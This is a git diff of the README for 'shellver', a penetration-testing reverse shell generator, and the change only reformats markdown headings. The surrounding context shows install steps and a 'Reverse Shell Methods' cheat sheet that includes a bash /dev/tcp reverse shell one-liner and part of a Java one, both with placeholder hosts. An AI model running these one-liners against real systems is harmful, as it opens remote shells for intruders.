@@ -3,7 +3,7 @@
                                                  .:: cyber-warrior.org ::.
                                          .:: Heavily modified by Jonas A. Wendorf ::.
 
-#Install Note
+# Install Note
 Clone the repository:
 
 `git clone https://github.com/jonasw234/shellver.git`
@@ -24,7 +24,7 @@ Run `shellver -h` or `shellver msf` or `shellver shell`
 
 Needs [msfpc](https://github.com/g0tmi1k/msfpc) for msfvenom payloads.
 
-#Changes from the original
+# Changes from the original
 - Upgraded to Python 3
 - Automatically spawn listener for msfvenom payloads
 - Use [msfpc](https://github.com/g0tmi1k/msfpc) instead of msfvenom for easier reuse
@@ -35,7 +35,7 @@ Needs [msfpc](https://github.com/g0tmi1k/msfpc) for msfvenom payloads.
 - Automatically use `sudo` if needed
 - Probably a bunch more stuff I’m currently forgetting
 
-#Example
+# Example
 shellver shell
 
 <img src="https://github.com/0xR0/shellver/blob/master/ss/py.png" >
@@ -46,7 +46,7 @@ shellver msf
 
 From https://github.com/swisskyrepo
 
-#Reverse Shell Methods
+# Reverse Shell Methods
 ```
 ╔BASH TCP═══════════════════════════════════════════
 ║ bash -i >& /dev/tcp/xxx/yyy 0>&1
@@ -142,8 +142,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ╚═══════════════════╩═══════════════════════════════
 ```
 
-#Thanks to
-
+# Thanks to
 * [The original shellver](https://github.com/0xR0/shellver)
 * [Reverse Bash Shell One Liner](https://security.stackexchange.com/questions/166643/reverse-bash-shell-one-liner)
 * [Pentest Monkey - Cheat Sheet Reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
